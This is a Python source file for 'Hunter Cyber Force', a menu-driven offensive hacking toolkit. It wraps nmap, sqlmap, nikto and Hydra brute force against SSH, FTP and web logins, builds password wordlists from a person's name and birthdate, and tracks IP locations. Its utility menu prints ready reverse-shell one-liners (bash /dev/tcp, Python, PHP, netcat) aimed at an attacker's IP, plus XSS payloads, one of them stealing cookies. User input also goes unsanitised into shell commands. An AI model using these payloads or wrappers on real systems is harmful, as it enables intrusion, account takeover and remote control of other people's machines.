#!/usr/bin/env python3
# ================================================================
#   HUNTER CYBER FORCE — Main Tool
#   Author  : HCF Team
#   Version : 2.0
#   GitHub  : github.com/sadnamaltamim-HCF/HunterCyberForce
# ================================================================

import os
import sys
import time
import socket
import subprocess
import platform
import datetime

# ── Colors ───────────────────────────────────────────────────────
R  = "\033[0;31m"
G  = "\033[0;32m"
Y  = "\033[1;33m"
C  = "\033[0;36m"
W  = "\033[1;37m"
B  = "\033[0;34m"
M  = "\033[0;35m"
RS = "\033[0m"

# ── Utilities ────────────────────────────────────────────────────
def clear():
    os.system("clear")

def run(cmd):
    os.system(cmd)

def pause():
    input(Y + "\n  [↵] Press Enter to continue..." + RS)

def get_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ── Banner ───────────────────────────────────────────────────────
def banner():
    clear()
    print(R + """
  ██╗  ██╗ ██████╗███████╗
  ██║  ██║██╔════╝██╔════╝
  ███████║██║     █████╗  
  ██╔══██║██║     ██╔══╝  
  ██║  ██║╚██████╗██║     
  ╚═╝  ╚═╝ ╚═════╝╚═╝    """ + RS)
    print(C + "  ══════ HUNTER CYBER FORCE ══════" + RS)
    print(W + f"  [*] Version  : 2.0" + RS)
    print(W + f"  [*] Time     : {get_time()}" + RS)
    print(W + f"  [*] Platform : {platform.system()} {platform.release()}" + RS)
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(W + f"  [*] Device   : {hostname}" + RS)
        print(W + f"  [*] Local IP : {local_ip}" + RS)
    except:
        pass
    print(C + "  ─────────────────────────────────" + RS)
    print()

# ── Main Menu ────────────────────────────────────────────────────
def main_menu():
    banner()
    print(Y + "  ══ MAIN MENU ══" + RS)
    print()
    print(W + "  [01] " + C + "🔍 Reconnaissance" + RS)
    print(W + "  [02] " + C + "🌐 Web Tools" + RS)
    print(W + "  [03] " + C + "🔑 Password Tools" + RS)
    print(W + "  [04] " + C + "📡 Network Tools" + RS)
    print(W + "  [05] " + C + "💻 System Info" + RS)
    print(W + "  [06] " + C + "🛠️  Utility Tools" + RS)
    print(W + "  [07] " + C + "☁️  Tunnel Tools" + RS)
    print(W + "  [08] " + C + "📦 Package Manager" + RS)
    print(W + "  [09] " + C + "🌍 IP Tracker (Advanced)" + RS)
    print(W + "  [00] " + R + "❌ Exit" + RS)
    print()
    return input(Y + "  HCF » " + RS).strip()

# ══════════════════════════════════════════════════════════════════
# [01] RECONNAISSANCE
# ══════════════════════════════════════════════════════════════════
def menu_recon():
    while True:
        banner()
        print(Y + "  ══ RECONNAISSANCE ══" + RS)
        print()
        print(W + "  [1] " + C + "Nmap Port Scan" + RS)
        print(W + "  [2] " + C + "Nmap Full Scan (All ports)" + RS)
        print(W + "  [3] " + C + "Nmap OS Detection" + RS)
        print(W + "  [4] " + C + "WHOIS Lookup" + RS)
        print(W + "  [5] " + C + "DNS Lookup" + RS)
        print(W + "  [6] " + C + "Subdomain Finder (Subfinder)" + RS)
        print(W + "  [7] " + C + "Ping Target" + RS)
        print(W + "  [8] " + C + "Traceroute" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Recon » " + RS).strip()

        if ch == "1":
            t = input(C + "  Target IP/Domain: " + RS)
            run(f"nmap -sV -sC {t}")
            pause()
        elif ch == "2":
            t = input(C + "  Target IP/Domain: " + RS)
            run(f"nmap -p- {t}")
            pause()
        elif ch == "3":
            t = input(C + "  Target IP/Domain: " + RS)
            run(f"nmap -O {t}")
            pause()
        elif ch == "4":
            t = input(C + "  Domain: " + RS)
            run(f"whois {t}")
            pause()
        elif ch == "5":
            t = input(C + "  Domain: " + RS)
            run(f"nslookup {t}")
            pause()
        elif ch == "6":
            t = input(C + "  Domain: " + RS)
            run(f"subfinder -d {t}")
            pause()
        elif ch == "7":
            t = input(C + "  Target: " + RS)
            run(f"ping -c 4 {t}")
            pause()
        elif ch == "8":
            t = input(C + "  Target: " + RS)
            run(f"traceroute {t}")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [02] WEB TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_web():
    while True:
        banner()
        print(Y + "  ══ WEB TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "SQLMap (SQL Injection)" + RS)
        print(W + "  [2] " + C + "SQLMap (Auto + DBs)" + RS)
        print(W + "  [3] " + C + "WhatWeb Fingerprint" + RS)
        print(W + "  [4] " + C + "Nikto Web Scanner" + RS)
        print(W + "  [5] " + C + "Nuclei Vuln Scanner" + RS)
        print(W + "  [6] " + C + "Curl Request" + RS)
        print(W + "  [7] " + C + "HTTP Headers Check" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Web » " + RS).strip()

        if ch == "1":
            url = input(C + "  Target URL (with param): " + RS)
            run(f"sqlmap -u '{url}' --batch")
            pause()
        elif ch == "2":
            url = input(C + "  Target URL: " + RS)
            run(f"sqlmap -u '{url}' --batch --dbs")
            pause()
        elif ch == "3":
            url = input(C + "  Target URL: " + RS)
            run(f"whatweb {url}")
            pause()
        elif ch == "4":
            url = input(C + "  Target URL: " + RS)
            run(f"perl ~/tools/nikto/program/nikto.pl -h {url}")
            pause()
        elif ch == "5":
            url = input(C + "  Target URL: " + RS)
            run(f"nuclei -u {url}")
            pause()
        elif ch == "6":
            url = input(C + "  URL: " + RS)
            run(f"curl -s {url}")
            pause()
        elif ch == "7":
            url = input(C + "  URL: " + RS)
            run(f"curl -I {url}")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [03] PASSWORD TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_password():
    while True:
        banner()
        print(Y + "  ══ PASSWORD TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "Hydra SSH Brute Force" + RS)
        print(W + "  [2] " + C + "Hydra FTP Brute Force" + RS)
        print(W + "  [3] " + C + "Hydra HTTP Login Brute Force" + RS)
        print(W + "  [4] " + C + "Hash Identifier" + RS)
        print(W + "  [5] " + C + "MD5 / SHA256 Generator" + RS)
        print(W + "  [6] " + C + "Wordlist Generator (Custom)" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Pass » " + RS).strip()

        if ch == "1":
            ip   = input(C + "  Target IP: " + RS)
            user = input(C + "  Username: " + RS)
            wl   = input(C + "  Wordlist path: " + RS)
            run(f"hydra -l {user} -P {wl} ssh://{ip}")
            pause()
        elif ch == "2":
            ip   = input(C + "  Target IP: " + RS)
            user = input(C + "  Username: " + RS)
            wl   = input(C + "  Wordlist path: " + RS)
            run(f"hydra -l {user} -P {wl} ftp://{ip}")
            pause()
        elif ch == "3":
            url  = input(C + "  Login URL: " + RS)
            user = input(C + "  Username: " + RS)
            wl   = input(C + "  Wordlist path: " + RS)
            post = input(C + "  POST data (user=^USER^&pass=^PASS^): " + RS)
            fail = input(C + "  Fail string: " + RS)
            run(f"hydra -l {user} -P {wl} {url} http-post-form '{post}:{fail}'")
            pause()
        elif ch == "4":
            h = input(C + "  Enter hash: " + RS)
            # Simple hash length identifier
            length = len(h)
            types = {32: "MD5", 40: "SHA1", 56: "SHA224",
                     64: "SHA256", 96: "SHA384", 128: "SHA512"}
            print(G + f"  Possible type: {types.get(length, 'Unknown')}" + RS)
            pause()
        elif ch == "5":
            import hashlib
            text = input(C + "  Enter text: " + RS)
            print(G + f"  MD5    : {hashlib.md5(text.encode()).hexdigest()}" + RS)
            print(G + f"  SHA256 : {hashlib.sha256(text.encode()).hexdigest()}" + RS)
            print(G + f"  SHA512 : {hashlib.sha512(text.encode()).hexdigest()}" + RS)
            pause()
        elif ch == "6":
            name   = input(C + "  Your name: " + RS)
            birth  = input(C + "  Birthdate (ddmmyyyy): " + RS)
            nick   = input(C + "  Nickname: " + RS)
            fname  = f"wordlist_{name}.txt"
            words  = set()
            for w in [name, nick, birth]:
                words.update([w, w+"123", w+"@123", w+"#1",
                               w.lower(), w.upper(),
                               w+"2024", w+"2025", w+"2026",
                               name+birth, nick+birth])
            with open(fname, "w") as f:
                f.write("\n".join(words))
            print(G + f"  Wordlist saved: {fname} ({len(words)} words)" + RS)
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [04] NETWORK TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_network():
    while True:
        banner()
        print(Y + "  ══ NETWORK TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "My Public IP" + RS)
        print(W + "  [2] " + C + "Local Network Scan" + RS)
        print(W + "  [3] " + C + "Open Ports (localhost)" + RS)
        print(W + "  [4] " + C + "IP Geolocation" + RS)
        print(W + "  [5] " + C + "MAC Address Lookup" + RS)
        print(W + "  [6] " + C + "Network Interfaces" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Net » " + RS).strip()

        if ch == "1":
            run("curl -s ifconfig.me && echo")
            pause()
        elif ch == "2":
            subnet = input(C + "  Subnet (e.g. 192.168.1.0/24): " + RS)
            run(f"nmap -sn {subnet}")
            pause()
        elif ch == "3":
            run("nmap -sT localhost")
            pause()
        elif ch == "4":
            ip = input(C + "  IP Address: " + RS)
            run(f"curl -s https://ipinfo.io/{ip}")
            pause()
        elif ch == "5":
            mac = input(C + "  MAC Address: " + RS)
            run(f"curl -s https://api.macvendors.com/{mac}")
            pause()
        elif ch == "6":
            run("ip addr show")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [05] SYSTEM INFO
# ══════════════════════════════════════════════════════════════════
def menu_sysinfo():
    banner()
    print(Y + "  ══ SYSTEM INFO ══" + RS)
    print()

    # Device info
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except:
        hostname = "N/A"
        local_ip = "N/A"

    print(C + f"  Hostname    : " + W + hostname + RS)
    print(C + f"  Local IP    : " + W + local_ip + RS)
    print(C + f"  Platform    : " + W + platform.system() + RS)
    print(C + f"  Release     : " + W + platform.release() + RS)
    print(C + f"  Python      : " + W + platform.python_version() + RS)
    print(C + f"  Time        : " + W + get_time() + RS)
    print()

    # Public IP
    print(Y + "  [*] Fetching public IP..." + RS)
    run("curl -s ifconfig.me && echo")
    print()

    # Storage
    print(Y + "  [*] Storage:" + RS)
    run("df -h /data/data/com.termux 2>/dev/null || df -h ~")
    print()

    # Memory
    print(Y + "  [*] Memory:" + RS)
    run("free -h 2>/dev/null || cat /proc/meminfo | head -5")

    pause()

# ══════════════════════════════════════════════════════════════════
# [06] UTILITY TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_utility():
    while True:
        banner()
        print(Y + "  ══ UTILITY TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "Base64 Encode/Decode" + RS)
        print(W + "  [2] " + C + "URL Encode/Decode" + RS)
        print(W + "  [3] " + C + "Reverse Shell Generator" + RS)
        print(W + "  [4] " + C + "Payload Encoder (XSS)" + RS)
        print(W + "  [5] " + C + "String to Hex / Hex to String" + RS)
        print(W + "  [6] " + C + "Port Number Info" + RS)
        print(W + "  [7] " + C + "Git Quick Push" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Util » " + RS).strip()

        if ch == "1":
            import base64
            mode = input(C + "  [E]ncode or [D]ecode? " + RS).strip().upper()
            text = input(C + "  Input: " + RS)
            if mode == "E":
                print(G + "  Result: " + base64.b64encode(text.encode()).decode() + RS)
            else:
                try:
                    print(G + "  Result: " + base64.b64decode(text).decode() + RS)
                except:
                    print(R + "  Invalid base64!" + RS)
            pause()
        elif ch == "2":
            from urllib.parse import quote, unquote
            mode = input(C + "  [E]ncode or [D]ecode? " + RS).strip().upper()
            text = input(C + "  Input: " + RS)
            if mode == "E":
                print(G + "  Result: " + quote(text) + RS)
            else:
                print(G + "  Result: " + unquote(text) + RS)
            pause()
        elif ch == "3":
            ip   = input(C + "  Your IP (attacker): " + RS)
            port = input(C + "  Your Port: " + RS)
            print()
            print(Y + "  ── Reverse Shell Payloads ──" + RS)
            print(C + f"  [Bash]   " + W + f"bash -i >& /dev/tcp/{ip}/{port} 0>&1" + RS)
            print(C + f"  [Python] " + W + f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'" + RS)
            print(C + f"  [PHP]    " + W + f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" + RS)
            print(C + f"  [Netcat] " + W + f"nc {ip} {port} -e /bin/bash" + RS)
            print(C + f"  [Netcat2]" + W + f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f" + RS)
            print()
            print(Y + "  Listener command:" + RS)
            print(W + f"  nc -lvnp {port}" + RS)
            pause()
        elif ch == "4":
            print(Y + "  ── XSS Payloads ──" + RS)
            payloads = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '<body onload=alert(1)>',
                '"><img src=x onerror=alert(document.cookie)>',
            ]
            for i, p in enumerate(payloads, 1):
                print(W + f"  [{i}] " + C + p + RS)
            pause()
        elif ch == "5":
            mode = input(C + "  [E]ncode (str→hex) or [D]ecode (hex→str)? " + RS).strip().upper()
            text = input(C + "  Input: " + RS)
            if mode == "E":
                print(G + "  Result: " + text.encode().hex() + RS)
            else:
                try:
                    print(G + "  Result: " + bytes.fromhex(text).decode() + RS)
                except:
                    print(R + "  Invalid hex!" + RS)
            pause()
        elif ch == "6":
            ports_info = {
                "21": "FTP", "22": "SSH", "23": "Telnet",
                "25": "SMTP", "53": "DNS", "80": "HTTP",
                "110": "POP3", "143": "IMAP", "443": "HTTPS",
                "445": "SMB", "3306": "MySQL", "3389": "RDP",
                "5432": "PostgreSQL", "6379": "Redis", "8080": "HTTP-Alt",
                "27017": "MongoDB"
            }
            print(Y + "  ── Common Ports ──" + RS)
            for port, name in ports_info.items():
                print(W + f"  {port:>5} " + C + f"→ {name}" + RS)
            pause()
        elif ch == "7":
            msg = input(C + "  Commit message: " + RS)
            run(f'git add . && git commit -m "{msg}" && git push')
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [07] TUNNEL TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_tunnel():
    while True:
        banner()
        print(Y + "  ══ TUNNEL TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "Ngrok HTTP Tunnel" + RS)
        print(W + "  [2] " + C + "Ngrok TCP Tunnel" + RS)
        print(W + "  [3] " + C + "Cloudflare Tunnel" + RS)
        print(W + "  [4] " + C + "Start Python HTTP Server" + RS)
        print(W + "  [5] " + C + "Start PHP Server" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Tunnel » " + RS).strip()

        if ch == "1":
            port = input(C + "  Port: " + RS)
            run(f"ngrok http {port}")
            pause()
        elif ch == "2":
            port = input(C + "  Port: " + RS)
            run(f"ngrok tcp {port}")
            pause()
        elif ch == "3":
            port = input(C + "  Local Port: " + RS)
            run(f"cloudflared tunnel --url http://localhost:{port}")
            pause()
        elif ch == "4":
            port = input(C + "  Port (default 8080): " + RS) or "8080"
            print(G + f"  Server started at http://localhost:{port}" + RS)
            run(f"python3 -m http.server {port}")
            pause()
        elif ch == "5":
            port = input(C + "  Port (default 8080): " + RS) or "8080"
            run(f"php -S 0.0.0.0:{port}")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [08] PACKAGE MANAGER
# ══════════════════════════════════════════════════════════════════
def menu_pkg():
    while True:
        banner()
        print(Y + "  ══ PACKAGE MANAGER ══" + RS)
        print()
        print(W + "  [1] " + C + "Update all packages" + RS)
        print(W + "  [2] " + C + "Install a package (pkg)" + RS)
        print(W + "  [3] " + C + "Install a Python lib (pip)" + RS)
        print(W + "  [4] " + C + "List installed packages" + RS)
        print(W + "  [5] " + C + "Remove a package" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Pkg » " + RS).strip()

        if ch == "1":
            run("pkg update -y && pkg upgrade -y")
            pause()
        elif ch == "2":
            pkg = input(C + "  Package name: " + RS)
            run(f"pkg install {pkg} -y")
            pause()
        elif ch == "3":
            lib = input(C + "  Library name: " + RS)
            run(f"pip install {lib}")
            pause()
        elif ch == "4":
            run("pkg list-installed 2>/dev/null | head -50")
            pause()
        elif ch == "5":
            pkg = input(C + "  Package to remove: " + RS)
            run(f"pkg uninstall {pkg} -y")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [09] IP TRACKER (ADVANCED)
# ══════════════════════════════════════════════════════════════════
def menu_ip_tracker():
    import json
    import urllib.request
    import urllib.error

    def fetch_ip_info(ip):
        try:
            # Primary API
            url = f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                return json.loads(r.read().decode())
        except:
            return None

    def fetch_ip_extra(ip):
        try:
            url = f"https://ipinfo.io/{ip}/json"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                return json.loads(r.read().decode())
        except:
            return None

    def fetch_abuse(ip):
        try:
            url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}&maxAgeInDays=90"
            return None  # Requires API key — skip silently
        except:
            return None

    def display_result(data, extra):
        print()
        print(C + "  ╔══════════════════════════════════════════╗" + RS)
        print(C + "  ║         🌍 IP TRACKER RESULT             ║" + RS)
        print(C + "  ╚══════════════════════════════════════════╝" + RS)
        print()

        if data and data.get("status") == "success":
            ip       = data.get("query", "N/A")
            country  = data.get("country", "N/A")
            cc       = data.get("countryCode", "")
            region   = data.get("regionName", "N/A")
            city     = data.get("city", "N/A")
            district = data.get("district", "N/A")
            zipcode  = data.get("zip", "N/A")
            lat      = data.get("lat", "N/A")
            lon      = data.get("lon", "N/A")
            tz       = data.get("timezone", "N/A")
            offset   = data.get("offset", "N/A")
            currency = data.get("currency", "N/A")
            isp      = data.get("isp", "N/A")
            org      = data.get("org", "N/A")
            asn      = data.get("as", "N/A")
            asname   = data.get("asname", "N/A")
            reverse  = data.get("reverse", "N/A")
            mobile   = "📱 Yes" if data.get("mobile") else "🖥️ No"
            proxy    = "⚠️ Yes" if data.get("proxy") else "✅ No"
            hosting  = "☁️ Yes" if data.get("hosting") else "✅ No"
            continent= data.get("continent", "N/A")

            print(Y  + f"  {'TARGET IP':<18}: " + W + ip + RS)
            print()
            print(G  + "  ── 📍 Location ──────────────────────────" + RS)
            print(W  + f"  {'Continent':<18}: " + C + f"{continent}" + RS)
            print(W  + f"  {'Country':<18}: " + C + f"{country} [{cc}]" + RS)
            print(W  + f"  {'Region':<18}: " + C + region + RS)
            print(W  + f"  {'City':<18}: " + C + city + RS)
            print(W  + f"  {'District':<18}: " + C + district + RS)
            print(W  + f"  {'ZIP Code':<18}: " + C + zipcode + RS)
            print(W  + f"  {'Latitude':<18}: " + C + str(lat) + RS)
            print(W  + f"  {'Longitude':<18}: " + C + str(lon) + RS)
            print(W  + f"  {'Timezone':<18}: " + C + tz + RS)
            print(W  + f"  {'UTC Offset':<18}: " + C + str(offset) + RS)
            print(W  + f"  {'Currency':<18}: " + C + currency + RS)
            print()
            print(G  + "  ── 🌐 Network ───────────────────────────" + RS)
            print(W  + f"  {'ISP':<18}: " + C + isp + RS)
            print(W  + f"  {'Organization':<18}: " + C + org + RS)
            print(W  + f"  {'ASN':<18}: " + C + asn + RS)
            print(W  + f"  {'AS Name':<18}: " + C + asname + RS)
            print(W  + f"  {'Reverse DNS':<18}: " + C + reverse + RS)
            print()
            print(G  + "  ── 🔍 Detection ─────────────────────────" + RS)
            print(W  + f"  {'Mobile':<18}: " + C + mobile + RS)
            print(W  + f"  {'Proxy/VPN':<18}: " + C + proxy + RS)
            print(W  + f"  {'Hosting/DC':<18}: " + C + hosting + RS)
            print()

            # Google Maps link
            print(G  + "  ── 🗺️  Map Link ──────────────────────────" + RS)
            print(W  + f"  https://www.google.com/maps?q={lat},{lon}" + RS)
            print()

        elif data and data.get("status") == "fail":
            print(R + f"  [✗] Error: {data.get('message', 'Unknown error')}" + RS)
        else:
            print(R + "  [✗] Could not fetch data. Check internet." + RS)

        # Extra info from ipinfo.io
        if extra:
            hostname = extra.get("hostname", "N/A")
            bogon    = extra.get("bogon", False)
            if hostname != "N/A" or bogon:
                print(G + "  ── 📡 Extra Info ────────────────────────" + RS)
                if hostname != "N/A":
                    print(W + f"  {'Hostname':<18}: " + C + hostname + RS)
                if bogon:
                    print(R + f"  {'Bogon IP':<18}: " + C + "Yes (Private/Reserved)" + RS)
                print()

    while True:
        banner()
        print(Y + "  ══ 🌍 IP TRACKER (ADVANCED) ══" + RS)
        print()
        print(W + "  [1] " + C + "Track Single IP" + RS)
        print(W + "  [2] " + C + "Track Multiple IPs (from file)" + RS)
        print(W + "  [3] " + C + "My Public IP Info" + RS)
        print(W + "  [4] " + C + "IP to Location (Quick)" + RS)
        print(W + "  [5] " + C + "Bulk IP Scan (manual list)" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/IPTracker » " + RS).strip()

        if ch == "1":
            ip = input(C + "  Enter IP Address: " + RS).strip()
            if not ip:
                print(R + "  [!] No IP entered!" + RS)
                pause()
                continue
            print(Y + f"\n  [*] Tracking {ip}..." + RS)
            data  = fetch_ip_info(ip)
            extra = fetch_ip_extra(ip)
            display_result(data, extra)
            # Save option
            save = input(Y + "  Save result to file? [y/N]: " + RS).strip().lower()
            if save == "y":
                fname = f"ip_result_{ip.replace('.','_')}.txt"
                with open(fname, "w") as f:
                    if data:
                        for k, v in data.items():
                            f.write(f"{k}: {v}\n")
                print(G + f"  Saved to {fname}" + RS)
            pause()

        elif ch == "2":
            fpath = input(C + "  File path (one IP per line): " + RS).strip()
            try:
                with open(fpath) as f:
                    ips = [line.strip() for line in f if line.strip()]
                for ip in ips:
                    print(Y + f"\n  [*] Tracking {ip}..." + RS)
                    data  = fetch_ip_info(ip)
                    extra = fetch_ip_extra(ip)
                    display_result(data, extra)
                    time.sleep(1.5)  # Rate limit respect
            except FileNotFoundError:
                print(R + "  [!] File not found!" + RS)
            pause()

        elif ch == "3":
            print(Y + "\n  [*] Fetching your public IP..." + RS)
            try:
                req = urllib.request.Request(
                    "https://api.ipify.org",
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                with urllib.request.urlopen(req, timeout=10) as r:
                    my_ip = r.read().decode().strip()
                print(G + f"\n  Your Public IP: {my_ip}" + RS)
                data  = fetch_ip_info(my_ip)
                extra = fetch_ip_extra(my_ip)
                display_result(data, extra)
            except:
                print(R + "  [!] Could not fetch IP. Check internet." + RS)
            pause()

        elif ch == "4":
            ip = input(C + "  Enter IP: " + RS).strip()
            print(Y + f"\n  [*] Quick lookup for {ip}..." + RS)
            data = fetch_ip_info(ip)
            if data and data.get("status") == "success":
                print(G + f"\n  IP       : {data.get('query')}" + RS)
                print(G + f"  Country  : {data.get('country')} [{data.get('countryCode')}]" + RS)
                print(G + f"  City     : {data.get('city')}, {data.get('regionName')}" + RS)
                print(G + f"  ISP      : {data.get('isp')}" + RS)
                print(G + f"  Lat/Lon  : {data.get('lat')}, {data.get('lon')}" + RS)
                print(G + f"  Map      : https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}" + RS)
            else:
                print(R + "  [!] Lookup failed!" + RS)
            pause()

        elif ch == "5":
            print(C + "  Enter IPs one by one (blank line to stop):" + RS)
            ips = []
            while True:
                ip = input(C + f"  IP [{len(ips)+1}]: " + RS).strip()
                if not ip:
                    break
                ips.append(ip)
            for ip in ips:
                print(Y + f"\n  [*] Tracking {ip}..." + RS)
                data  = fetch_ip_info(ip)
                extra = fetch_ip_extra(ip)
                display_result(data, extra)
                time.sleep(1.5)
            pause()

        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════
def main():
    menu_map = {
        "1": menu_recon,
        "2": menu_web,
        "3": menu_password,
        "4": menu_network,
        "5": menu_sysinfo,
        "6": menu_utility,
        "7": menu_tunnel,
        "8": menu_pkg,
        "9": menu_ip_tracker,
    }

    while True:
        ch = main_menu()
        if ch == "0":
            clear()
            print(R + """
  ██╗  ██╗ ██████╗███████╗
  ██║  ██║██╔════╝██╔════╝
  ███████║██║     █████╗  
  ██╔══██║██║     ██╔══╝  
  ██║  ██║╚██████╗██║     
  ╚═╝  ╚═╝ ╚═════╝╚═╝    """ + RS)
            print(C + "  Stay Sharp. Stay Silent. 🔴" + RS)
            print()
            sys.exit(0)
        elif ch in menu_map:
            menu_map[ch]()
        else:
            print(R + "  [!] Invalid option!" + RS)
            time.sleep(0.8)

if __name__ == "__main__":
    main()
